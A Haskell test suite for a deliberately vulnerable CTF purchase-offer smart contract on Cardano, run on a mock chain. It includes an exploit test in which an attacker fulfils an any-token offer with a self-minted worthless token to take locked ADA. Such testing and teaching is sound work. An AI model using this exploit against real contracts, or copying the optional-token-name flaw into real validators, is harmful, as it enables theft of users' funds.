{-# LANGUAGE DeriveAnyClass #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE NamedFieldPuns #-}
{-# LANGUAGE NumericUnderscores #-}
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE TemplateHaskell #-}
{-# LANGUAGE TypeApplications #-}
{-# LANGUAGE TypeFamilies #-}
{-# LANGUAGE ViewPatterns #-}

{- | Tests for the Aiken-compiled CTF Purchase Offer validator using TestingInterface.

This module demonstrates property-based testing of a vulnerable purchase offer contract.
The CTF Purchase Offer validator has a **redeemer-controlled asset** vulnerability:

== Vulnerability: Optional token name allows attacker-controlled fulfillment ==

When @desired_token_name@ is @None@, the validator accepts ANY token from the
specified policy. The redeemer specifies @sold_policy_id@ and @sold_token_name@,
which the attacker controls. An attacker can:

1. See an offer for a valuable NFT from policy P with @desired_token_name = None@
2. Mint a WORTHLESS token with any name under policy P
3. "Sell" that worthless token to fulfill the offer and claim the locked ADA

This works because the validator trusts the redeemer-provided token name
without verifying it's the actually valuable/legitimate token.

The Aiken types encode as:
- @Datum { owner: Address, desired_policy_id: PolicyId, desired_token_name: Option<AssetName> }@
- @SellRedeemer { sold_policy_id: PolicyId, sold_token_name: AssetName }@

The Aiken Address type maps directly to PlutusLedgerApi.V1.Address.
-}
module AikenPurchaseOfferSpec (
  -- * TestingInterface model
  PurchaseOfferModel (..),

  -- * Test tree
  aikenPurchaseOfferTests,

  -- * Standalone threat model tests
  propPurchaseOfferVulnerableToRedeemerManipulation,
) where

import Cardano.Api qualified as C
import Control.Monad (void)
import Control.Monad.Except (MonadError, runExceptT)
import Control.Monad.IO.Class (MonadIO (..))
import Convex.Aiken.Blueprint (Blueprint (..))
import Convex.Aiken.Blueprint qualified as Blueprint
import Convex.BuildTx (MonadBuildTx, execBuildTx, setMinAdaDepositAll)
import Convex.BuildTx qualified as BuildTx
import Convex.Class (MonadMockchain, getUtxo)
import Convex.CoinSelection (BalanceTxError, ChangeOutputPosition (TrailingChange))
import Convex.MockChain (fromLedgerUTxO, runMockchain0IOWith)
import Convex.MockChain.CoinSelection (balanceAndSubmit, tryBalanceAndSubmit)
import Convex.MockChain.Defaults qualified as Defaults
import Convex.MockChain.Utils (mockchainSucceeds)
import Convex.PlutusLedger.V1 (transAddressInEra)
import Convex.TestingInterface (
  Options (Options, params),
  RunOptions (mcOptions),
  TestingInterface (..),
  propRunActionsWithOptions,
 )
import Convex.ThreatModel.Cardano.Api (dummyTxId)
import Convex.ThreatModel.RedeemerAssetSubstitution (redeemerAssetSubstitution)
import Convex.Utils (failOnError)
import Convex.Wallet (Wallet, addressInEra)
import Convex.Wallet.MockWallet qualified as Wallet
import Data.ByteString qualified as BS
import Data.Map qualified as Map
import Data.Maybe (mapMaybe)
import GHC.Exts (fromList)

import Paths_convex_testing_interface qualified as Pkg
import PlutusLedgerApi.V1 qualified as PV1
import PlutusTx qualified
import PlutusTx.Builtins qualified as PlutusTx

import System.IO.Unsafe (unsafePerformIO)
import Test.QuickCheck.Monadic (monadicIO, monitor, run)
import Test.Tasty (TestTree, testGroup)
import Test.Tasty.HUnit (assertFailure, testCase)
import Test.Tasty.QuickCheck (
  Property,
  counterexample,
  testProperty,
 )
import Test.Tasty.QuickCheck qualified as QC

-- ----------------------------------------------------------------------------
-- Purchase Offer Datum and Redeemer types (wire-compatible with Aiken)
-- ----------------------------------------------------------------------------

{- | The datum stored at the purchase_offer script address.

Aiken encodes this as:
@Constr 0 [owner_address, desired_policy_id_bytes, optional_token_name]@

Fields:
- owner: Full Plutus Address who receives the NFT
- desired_policy_id: The PolicyId of the desired NFT
- desired_token_name: Optional specific token name; if None, any token from policy accepted
-}
data PurchaseOfferDatum = PurchaseOfferDatum
  { poOwner :: PV1.Address
  -- ^ The Plutus address of the owner who will receive the NFT
  , poDesiredPolicyId :: PlutusTx.BuiltinByteString
  -- ^ The PolicyId bytes of the desired NFT
  , poDesiredTokenName :: Maybe PlutusTx.BuiltinByteString
  -- ^ Optional token name; None means any token from the policy
  }
  deriving stock (Eq, Show)

{- | Redeemer that specifies which token is being sold.

Aiken encodes as:
@Constr 0 [sold_policy_id_bytes, sold_token_name_bytes]@
-}
data SellRedeemer = SellRedeemer
  { srSoldPolicyId :: PlutusTx.BuiltinByteString
  -- ^ The PolicyId bytes of the token being sold
  , srSoldTokenName :: PlutusTx.BuiltinByteString
  -- ^ The token name of the token being sold
  }
  deriving stock (Eq, Show)

-- Use TH for ToData/FromData/UnsafeFromData instances
PlutusTx.unstableMakeIsData ''PurchaseOfferDatum
PlutusTx.unstableMakeIsData ''SellRedeemer

-- ----------------------------------------------------------------------------
-- Script loading
-- ----------------------------------------------------------------------------

-- | Load the Aiken "ctf_purchase_offer" validator from the embedded blueprint
loadPurchaseOfferScript :: IO (C.PlutusScript C.PlutusScriptV3)
loadPurchaseOfferScript = do
  path <- Pkg.getDataFileName "test/data/aiken-contracts-example.json"
  Blueprint{validators} <- Blueprint.loadFromFile path >>= either fail pure
  case Map.lookup "ctf_purchase_offer.ctf_purchase_offer.spend" validators of
    Just (C.ScriptInAnyLang (C.PlutusScriptLanguage C.PlutusScriptV3) (C.PlutusScript _ ps)) ->
      pure ps
    _ -> fail "ctf_purchase_offer.ctf_purchase_offer.spend not found in Aiken blueprint"

{- | Top-level binding for the Aiken CTF Purchase Offer script.

We use 'unsafePerformIO' here because 'TestingInterface.initialState' is a
pure value (not a function), so we cannot pass the script in dynamically.
-}
{-# NOINLINE purchaseOfferScript #-}
purchaseOfferScript :: C.PlutusScript C.PlutusScriptV3
purchaseOfferScript = unsafePerformIO loadPurchaseOfferScript

-- | Helper to wrap PlutusScript as Script (for hashScript)
plutusScript :: C.PlutusScript C.PlutusScriptV3 -> C.Script C.PlutusScriptV3
plutusScript = C.PlutusScript C.PlutusScriptV3

-- | Hash of the purchase_offer script
purchaseOfferScriptHash :: C.ScriptHash
purchaseOfferScriptHash = C.hashScript (plutusScript purchaseOfferScript)

-- | Address of the purchase_offer script on the default network
purchaseOfferAddress :: C.AddressInEra C.ConwayEra
purchaseOfferAddress =
  C.makeShelleyAddressInEra
    C.shelleyBasedEra
    Defaults.networkId
    (C.PaymentCredentialByScript purchaseOfferScriptHash)
    C.NoStakeAddress

-- ----------------------------------------------------------------------------
-- Minting script for testing
-- ----------------------------------------------------------------------------

-- | A minting script that always succeeds (for testing)
mintingScript :: C.PlutusScript C.PlutusScriptV1
mintingScript = C.examplePlutusScriptAlwaysSucceeds C.WitCtxMint

-- | Policy ID of the test minting script
testPolicyId :: C.PolicyId
testPolicyId = C.PolicyId $ C.hashScript (C.PlutusScript C.PlutusScriptV1 mintingScript)

-- | Policy ID bytes for use in datums
testPolicyIdBytes :: PlutusTx.BuiltinByteString
testPolicyIdBytes = PlutusTx.toBuiltin (C.serialiseToRawBytes testPolicyId)

-- | Helper to create an AssetName from ByteString
unsafeAssetName :: BS.ByteString -> C.AssetName
unsafeAssetName = C.UnsafeAssetName

-- | A "valuable" token name (the one the offerer actually wants)
valuableTokenName :: C.AssetName
valuableTokenName = unsafeAssetName "RareNFT"

-- | A "worthless" token name (what the attacker provides)
worthlessTokenName :: C.AssetName
worthlessTokenName = unsafeAssetName "WorthlessJunk"

-- | Convert AssetName to BuiltinByteString for use in redeemer
assetNameToBuiltin :: C.AssetName -> PlutusTx.BuiltinByteString
assetNameToBuiltin (C.UnsafeAssetName bs) = PlutusTx.toBuiltin bs

-- | Mint tokens to a wallet (separate transaction for setup)
mintTokensToWallet
  :: forall m
   . (MonadBuildTx C.ConwayEra m)
  => C.AddressInEra C.ConwayEra
  -- ^ Destination wallet address
  -> C.AssetName
  -- ^ Token name to mint
  -> m ()
mintTokensToWallet destAddr tokenName = do
  BuildTx.mintPlutus mintingScript () tokenName 1
  let nftValue = fromList [(C.AssetId testPolicyId tokenName, 1)]
  BuildTx.payToAddress destAddr nftValue
  setMinAdaDepositAll Defaults.bundledProtocolParameters

{- | Mint BOTH valuable and worthless tokens to the same output
This ensures both tokens are in the same UTxO so the fulfill transaction
will include both when coin selection finds one of them.
-}
mintBothTokensToWallet
  :: forall m
   . (MonadBuildTx C.ConwayEra m)
  => C.AddressInEra C.ConwayEra
  -- ^ Destination wallet address
  -> m ()
mintBothTokensToWallet destAddr = do
  -- Mint both tokens
  BuildTx.mintPlutus mintingScript () valuableTokenName 1
  BuildTx.mintPlutus mintingScript () worthlessTokenName 1
  -- Send both to the same output
  let bothTokensValue =
        fromList
          [ (C.AssetId testPolicyId valuableTokenName, 1)
          , (C.AssetId testPolicyId worthlessTokenName, 1)
          ]
  BuildTx.payToAddress destAddr bothTokensValue
  setMinAdaDepositAll Defaults.bundledProtocolParameters

-- ----------------------------------------------------------------------------
-- Helper to convert wallet address to Plutus address
-- ----------------------------------------------------------------------------

-- | Get wallet Plutus address
walletPlutusAddress :: Wallet -> PV1.Address
walletPlutusAddress w =
  let addr = addressInEra @C.ConwayEra Defaults.networkId w
   in case transAddressInEra addr of
        Just a -> a
        Nothing -> error "Failed to convert wallet address to Plutus address"

-- ----------------------------------------------------------------------------
-- Transaction builders
-- ----------------------------------------------------------------------------

{- | Create a purchase offer: pay ADA to script with datum specifying desired NFT.

Creates an offer to buy an NFT from a specific policy.
When desired_token_name is Nothing, ANY token from that policy will be accepted.
-}
createOffer
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> Wallet
  -- ^ Owner who will receive the NFT
  -> C.Lovelace
  -- ^ Amount of ADA to offer
  -> PlutusTx.BuiltinByteString
  -- ^ Desired policy ID
  -> Maybe PlutusTx.BuiltinByteString
  -- ^ Optional specific token name (None = any token from policy)
  -> m ()
createOffer networkId owner offerAmount desiredPolicy desiredTokenName = do
  let ownerAddr = walletPlutusAddress owner
      datum =
        PurchaseOfferDatum
          { poOwner = ownerAddr
          , poDesiredPolicyId = desiredPolicy
          , poDesiredTokenName = desiredTokenName
          }
  BuildTx.payToScriptInlineDatum
    networkId
    purchaseOfferScriptHash
    datum
    C.NoStakeAddress
    (C.lovelaceToValue offerAmount)

{- | Fulfill a purchase offer: spend the script UTxO by providing the requested NFT.

The seller provides the NFT to the owner and claims the ADA.
The seller must already have the tokens in their wallet.
-}
fulfillOffer
  :: forall m
   . (MonadBuildTx C.ConwayEra m)
  => C.TxIn
  -- ^ The script UTxO to spend
  -> C.AddressInEra C.ConwayEra
  -- ^ Owner's address (receives the NFT)
  -> PlutusTx.BuiltinByteString
  -- ^ Policy ID of token being sold
  -> C.AssetName
  -- ^ Token name of token being sold
  -> m ()
fulfillOffer txIn ownerAddr soldPolicyIdBs tokenName = do
  let redeemer =
        SellRedeemer
          { srSoldPolicyId = soldPolicyIdBs
          , srSoldTokenName = assetNameToBuiltin tokenName
          }
      witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            purchaseOfferScript
            (C.ScriptDatumForTxIn Nothing)
            redeemer
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn witness
  -- Pay the NFT to the owner (along with min ADA)
  -- Coin selection will find the token from the seller's wallet
  let nftValue = fromList [(C.AssetId testPolicyId tokenName, 1)]
  BuildTx.payToAddress ownerAddr nftValue
  setMinAdaDepositAll Defaults.bundledProtocolParameters

-- ----------------------------------------------------------------------------
-- Helper to find script UTxOs
-- ----------------------------------------------------------------------------

-- | Find all UTxOs at the purchase_offer script address
findPurchaseOfferUtxos
  :: (MonadMockchain C.ConwayEra m)
  => m [(C.TxIn, C.Value, PurchaseOfferDatum)]
findPurchaseOfferUtxos = do
  utxoSet <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo
  let C.UTxO utxos = utxoSet
      scriptUtxos = Map.filter (\(C.TxOut addr _ _ _) -> addr == purchaseOfferAddress) utxos
  pure $ mapMaybe extractData $ Map.toList scriptUtxos
 where
  extractData (txIn, C.TxOut _ txOutValue datum _) =
    case txOutValue of
      C.TxOutValueShelleyBased _ val ->
        let value = C.fromMaryValue val
            d = case datum of
              C.TxOutDatumInline _ scriptData ->
                PlutusTx.unsafeFromBuiltinData @PurchaseOfferDatum
                  (PlutusTx.dataToBuiltinData $ C.toPlutusData $ C.getScriptData scriptData)
              _ -> error "Expected inline datum"
         in Just (txIn, value, d)
      C.TxOutValueByron _ -> Nothing

-- ----------------------------------------------------------------------------
-- Unit tests
-- ----------------------------------------------------------------------------

aikenPurchaseOfferUnitTests :: TestTree
aikenPurchaseOfferUnitTests =
  testGroup
    "ctf purchase_offer unit tests"
    [ testCase "create purchase offer with specific token name" $
        mockchainSucceeds $
          failOnError $ do
            -- Create offer for a SPECIFIC token name
            let txBody =
                  execBuildTx $
                    createOffer @C.ConwayEra
                      Defaults.networkId
                      Wallet.w1
                      50_000_000 -- 50 ADA offer
                      testPolicyIdBytes
                      (Just $ assetNameToBuiltin valuableTokenName) -- Specific token requested
            void $ tryBalanceAndSubmit mempty Wallet.w1 txBody TrailingChange []

            -- Verify UTxO exists at script address
            result <- findPurchaseOfferUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((_, _, datum) : _) -> do
                liftIO $
                  if poDesiredTokenName datum == Just (assetNameToBuiltin valuableTokenName)
                    then pure ()
                    else assertFailure $ "Wrong token name in datum: " ++ show datum
    , testCase "create purchase offer with any token (vulnerable pattern)" $
        mockchainSucceeds $
          failOnError $ do
            -- Create offer that accepts ANY token from the policy (VULNERABLE!)
            let txBody =
                  execBuildTx $
                    createOffer @C.ConwayEra
                      Defaults.networkId
                      Wallet.w1
                      50_000_000 -- 50 ADA offer
                      testPolicyIdBytes
                      Nothing -- Any token accepted!
            void $ tryBalanceAndSubmit mempty Wallet.w1 txBody TrailingChange []

            -- Verify UTxO exists with None for token name
            result <- findPurchaseOfferUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((_, _, datum) : _) -> do
                liftIO $
                  if poDesiredTokenName datum == Nothing
                    then pure ()
                    else assertFailure $ "Expected None for token name: " ++ show datum
    , testCase "fulfill offer with correct token (happy path)" $
        mockchainSucceeds $
          failOnError $ do
            -- First, mint the "valuable" token to w2 (the seller)
            let mintTxBody = execBuildTx $ mintTokensToWallet (addressInEra Defaults.networkId Wallet.w2) valuableTokenName
            _ <- tryBalanceAndSubmit mempty Wallet.w2 mintTxBody TrailingChange []

            -- Create offer for specific token
            let createTxBody =
                  execBuildTx $
                    createOffer @C.ConwayEra
                      Defaults.networkId
                      Wallet.w1
                      50_000_000
                      testPolicyIdBytes
                      (Just $ assetNameToBuiltin valuableTokenName)
            _ <- tryBalanceAndSubmit mempty Wallet.w1 createTxBody TrailingChange []

            -- Find the offer UTxO
            result <- findPurchaseOfferUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn, _, _) : _) -> do
                let ownerAddr = addressInEra Defaults.networkId Wallet.w1
                    fulfillTxBody =
                      execBuildTx $
                        fulfillOffer
                          txIn
                          ownerAddr
                          testPolicyIdBytes
                          valuableTokenName
                -- w2 fulfills the offer with the token they minted
                void $ tryBalanceAndSubmit mempty Wallet.w2 fulfillTxBody TrailingChange []

                -- Verify UTxO is gone
                result2 <- findPurchaseOfferUtxos
                case result2 of
                  [] -> pure ()
                  _ -> liftIO $ assertFailure "Expected no UTxO at script after fulfillment"
    , testCase "EXPLOIT: fulfill with wrong token when desired_token_name is None" $
        -- This demonstrates the redeemer-controlled asset vulnerability!
        mockchainSucceeds $
          failOnError $ do
            -- Attacker (w2) mints a WORTHLESS token
            let mintTxBody = execBuildTx $ mintTokensToWallet (addressInEra Defaults.networkId Wallet.w2) worthlessTokenName
            _ <- tryBalanceAndSubmit mempty Wallet.w2 mintTxBody TrailingChange []

            -- Create VULNERABLE offer (accepts any token from policy)
            let createTxBody =
                  execBuildTx $
                    createOffer @C.ConwayEra
                      Defaults.networkId
                      Wallet.w1
                      50_000_000 -- 50 ADA at stake
                      testPolicyIdBytes
                      Nothing -- Any token accepted!
            _ <- tryBalanceAndSubmit mempty Wallet.w1 createTxBody TrailingChange []

            -- Attacker (w2) fulfills with a WORTHLESS token!
            -- The offerer wanted "RareNFT" but the attacker provides "WorthlessJunk"
            result <- findPurchaseOfferUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn, _, _) : _) -> do
                let ownerAddr = addressInEra Defaults.networkId Wallet.w1
                    -- EXPLOIT: Use worthless token instead of the valuable one!
                    exploitTxBody =
                      execBuildTx $
                        fulfillOffer
                          txIn
                          ownerAddr
                          testPolicyIdBytes
                          worthlessTokenName -- Attacker controls this!
                          -- Attacker w2 executes the exploit
                void $ tryBalanceAndSubmit mempty Wallet.w2 exploitTxBody TrailingChange []

                -- Exploit succeeded! UTxO is spent, attacker claimed the ADA
                result2 <- findPurchaseOfferUtxos
                case result2 of
                  [] -> pure () -- Exploit worked!
                  _ -> liftIO $ assertFailure "Exploit should have succeeded"
    , testCase "normal use: fulfill with specified token name" $
        mockchainSucceeds $
          failOnError $ do
            -- First, mint the "valuable" token to w2 (the seller)
            let mintTxBody = execBuildTx $ mintTokensToWallet (addressInEra Defaults.networkId Wallet.w2) valuableTokenName
            _ <- tryBalanceAndSubmit mempty Wallet.w2 mintTxBody TrailingChange []

            -- Create offer with specific token name (SAFE pattern)
            let createTxBody =
                  execBuildTx $
                    createOffer @C.ConwayEra
                      Defaults.networkId
                      Wallet.w1
                      50_000_000
                      testPolicyIdBytes
                      (Just $ assetNameToBuiltin valuableTokenName) -- Specific token required
            _ <- tryBalanceAndSubmit mempty Wallet.w1 createTxBody TrailingChange []

            -- Try to fulfill with correct token
            result <- findPurchaseOfferUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn, _, _) : _) -> do
                let ownerAddr = addressInEra Defaults.networkId Wallet.w1
                    fulfillTxBody =
                      execBuildTx $
                        fulfillOffer
                          txIn
                          ownerAddr
                          testPolicyIdBytes
                          valuableTokenName
                void $ tryBalanceAndSubmit mempty Wallet.w2 fulfillTxBody TrailingChange []

                -- Verify successful fulfillment
                result2 <- findPurchaseOfferUtxos
                case result2 of
                  [] -> pure ()
                  _ -> liftIO $ assertFailure "Expected no UTxO after fulfillment"
    ]

-- ----------------------------------------------------------------------------
-- Standalone Threat Model Tests
-- ----------------------------------------------------------------------------

{- | Run a purchase offer scenario for threat model testing.

Creates an offer with desired_token_name = None (vulnerable pattern),
then attempts to fulfill it with the VALUABLE token.

For threat model testing, we mint BOTH tokens to the seller. The threat model
will then try to swap the valuable token for the worthless one. If the swap
succeeds (transaction still validates), the contract is vulnerable.

Returns the fulfill transaction and the UTxO state captured BEFORE the fulfill,
for threat model testing.
-}
purchaseOfferScenario
  :: ( MonadMockchain C.ConwayEra m
     , MonadError (BalanceTxError C.ConwayEra) m
     , MonadFail m
     )
  => m (C.Tx C.ConwayEra, C.UTxO C.ConwayEra)
purchaseOfferScenario = do
  -- Seller (w2) mints BOTH tokens in a SINGLE transaction
  -- This puts both tokens in the same UTxO, so the fulfill transaction
  -- will include both when coin selection finds the valuable token
  let mintBothTxBody = execBuildTx $ mintBothTokensToWallet (addressInEra Defaults.networkId Wallet.w2)
  _ <- tryBalanceAndSubmit mempty Wallet.w2 mintBothTxBody TrailingChange []

  -- w1 creates a VULNERABLE offer (any token from policy accepted)
  let createTxBody =
        execBuildTx $
          createOffer @C.ConwayEra
            Defaults.networkId
            Wallet.w1
            50_000_000
            testPolicyIdBytes
            Nothing -- Any token - VULNERABLE!
  _ <- tryBalanceAndSubmit mempty Wallet.w1 createTxBody TrailingChange []

  -- Capture UTxO BEFORE fulfillment (for threat model)
  utxoBefore <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo

  -- Find the offer
  result <- findPurchaseOfferUtxos
  case result of
    [] -> fail "Expected UTxO at script address"
    ((txIn, _, _) : _) -> do
      let ownerAddr = addressInEra Defaults.networkId Wallet.w1
          -- Legitimate fulfillment with the VALUABLE token
          -- The threat model will try to swap this for the worthless token
          fulfillTxBody =
            execBuildTx $
              fulfillOffer
                txIn
                ownerAddr
                testPolicyIdBytes
                valuableTokenName -- Using valuable token - threat model will try to swap
                -- w2 fulfills with valuable token
      fulfillTx <- tryBalanceAndSubmit mempty Wallet.w2 fulfillTxBody TrailingChange []
      pure (fulfillTx, utxoBefore)

{- | Test that the purchase_offer contract is vulnerable to redeemer manipulation.

This test demonstrates the core vulnerability: when desired_token_name is None,
the attacker controls which token name satisfies the purchase via the redeemer.

The test creates a vulnerable offer (desired_token_name = None), then attempts
to fulfill it with a worthless token. If the transaction succeeds, the
vulnerability is confirmed.

The test returns True when the exploit succeeds (vulnerability confirmed).
-}
propPurchaseOfferVulnerableToRedeemerManipulation :: RunOptions -> Property
propPurchaseOfferVulnerableToRedeemerManipulation opts = monadicIO $ do
  let Options{params} = mcOptions opts

  -- Run the scenario INSIDE MockchainT
  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    -- Create vulnerable offer and attempt exploit
    -- The scenario succeeds if an attacker can fulfill with a worthless token
    (_tx, _utxo) <- purchaseOfferScenario
    -- If we get here, the exploit succeeded - the worthless token was accepted!
    pure ()

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error (exploit failed): " ++ show err)
      -- If the exploit FAILED, the script might be secure
      -- But we expect it to SUCCEED (vulnerability exists)
      pure $ QC.property False
    (Right (), _finalState) -> do
      monitor (counterexample "Vulnerability confirmed: worthless token accepted!")
      -- The exploit transaction SUCCEEDED - vulnerability confirmed!
      pure $ QC.property True

-- ----------------------------------------------------------------------------
-- TestingInterface instance
-- ----------------------------------------------------------------------------

-- | Model state for the CTF Purchase Offer contract
data PurchaseOfferModel = PurchaseOfferModel
  { pomInitialized :: Bool
  -- ^ Whether an offer has been created
  , pomTxIn :: Maybe C.TxIn
  -- ^ The UTxO at the script
  , pomValue :: C.Lovelace
  -- ^ ADA locked in the offer
  , pomDesiredPolicyId :: Maybe PlutusTx.BuiltinByteString
  -- ^ The desired policy ID
  , pomDesiredTokenName :: Maybe (Maybe PlutusTx.BuiltinByteString)
  -- ^ The desired token name (Nothing = not initialized, Just Nothing = any token)
  , pomHasBeenFulfilled :: Bool
  -- ^ Once fulfilled, sequence is done - no re-initialization allowed
  }
  deriving stock (Show, Eq)

instance TestingInterface PurchaseOfferModel where
  -- Actions for Purchase Offer: create offer and fulfill it
  data Action PurchaseOfferModel
    = CreateOffer C.Lovelace
    | -- \^ Create a purchase offer with some ADA (uses None for token name - vulnerable)
      FulfillOffer
    -- \^ Fulfill the offer (uses worthless token - exploit)
    deriving stock (Show, Eq)

  initialState =
    PurchaseOfferModel
      { pomInitialized = False
      , pomTxIn = Nothing
      , pomValue = 0
      , pomDesiredPolicyId = Nothing
      , pomDesiredTokenName = Nothing
      , pomHasBeenFulfilled = False
      }

  -- Generate actions based on state
  -- Init-type actions (CreateOffer): TIGHT - only when not initialized AND not fulfilled
  -- Non-init actions (FulfillOffer): BROAD - for negative testing
  arbitraryAction model
    | not (pomInitialized model) && not (pomHasBeenFulfilled model) = CreateOffer <$> genOfferAmount
    | otherwise = pure FulfillOffer
   where
    genOfferAmount = fromInteger <$> QC.choose (20_000_000, 100_000_000)

  precondition model (CreateOffer _) = not (pomInitialized model) && not (pomHasBeenFulfilled model)
  precondition model FulfillOffer = pomInitialized model && not (pomHasBeenFulfilled model)

  nextState model action = case action of
    CreateOffer amount ->
      model
        { pomInitialized = True
        , pomTxIn = Just (C.TxIn dummyTxId (C.TxIx 0))
        , pomValue = amount
        , pomDesiredPolicyId = Just testPolicyIdBytes
        , pomDesiredTokenName = Just Nothing -- Any token accepted (vulnerable!)
        , pomHasBeenFulfilled = False
        }
    FulfillOffer ->
      model
        { pomInitialized = False
        , pomTxIn = Nothing
        , pomValue = 0
        , pomDesiredPolicyId = Nothing
        , pomDesiredTokenName = Nothing
        , pomHasBeenFulfilled = True
        }

  perform _model action = case action of
    CreateOffer amount -> do
      -- First, mint a worthless token for the attacker
      let mintTxBody = execBuildTx $ mintBothTokensToWallet (addressInEra Defaults.networkId Wallet.w1)
      void $ balanceAndSubmit mempty Wallet.w1 mintTxBody TrailingChange []
      -- Then create the offer
      let txBody =
            execBuildTx $
              createOffer @C.ConwayEra
                Defaults.networkId
                Wallet.w1
                amount
                testPolicyIdBytes
                Nothing -- Any token - VULNERABLE pattern
      void $ balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
    FulfillOffer -> do
      result <- findPurchaseOfferUtxos
      case result of
        [] -> fail "No UTxO found at purchase_offer script address"
        ((txIn, _, _) : _) -> do
          let ownerAddr = addressInEra Defaults.networkId Wallet.w1
              txBody =
                execBuildTx $
                  fulfillOffer
                    txIn
                    ownerAddr
                    testPolicyIdBytes
                    worthlessTokenName -- EXPLOIT: worthless token
                    -- NOTE: Using w1 for submission for threat model compatibility
          void $ balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []

  -- Simplified validation
  validate _model = pure True

  monitoring _state _action prop = prop

  expectedVulnerabilities = [redeemerAssetSubstitution]

-- ----------------------------------------------------------------------------
-- Test tree
-- ----------------------------------------------------------------------------

-- | All CTF Purchase Offer tests grouped together
aikenPurchaseOfferTests :: RunOptions -> TestTree
aikenPurchaseOfferTests runOpts =
  testGroup
    "ctf purchase_offer"
    [ aikenPurchaseOfferUnitTests
    , testGroup
        "property tests"
        [ propRunActionsWithOptions @PurchaseOfferModel
            "property-based testing"
            runOpts
        , testProperty
            "redeemer-controlled asset vulnerability confirmed"
            (propPurchaseOfferVulnerableToRedeemerManipulation runOpts)
        ]
    ]
